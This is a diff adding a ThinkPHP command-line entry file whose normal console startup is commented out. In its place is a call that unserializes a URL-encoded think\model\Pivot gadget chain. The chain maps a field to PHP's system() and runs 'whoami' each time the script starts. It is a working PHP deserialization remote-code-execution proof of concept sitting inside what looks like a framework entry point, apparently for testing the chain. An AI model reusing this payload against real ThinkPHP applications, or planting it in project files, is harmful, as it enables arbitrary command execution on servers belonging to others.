@@ -1,0 +1,17 @@
+#!/usr/bin/env php
+<?php
+namespace think;
+
+// 命令行入口文件
+// 加载基础文件
+require __DIR__ . '/vendor/autoload.php';
+
+
+
+// 应用初始化
+// (new App())->console->run();
+
+// (new App())->console;
+unserialize(urldecode("O%3A17%3A%22think%5Cmodel%5CPivot%22%3A6%3A%7Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A7%3A%22%00%2A%00name%22%3Br%3A1%3B%7D"));
+
+(new App())->initialize();
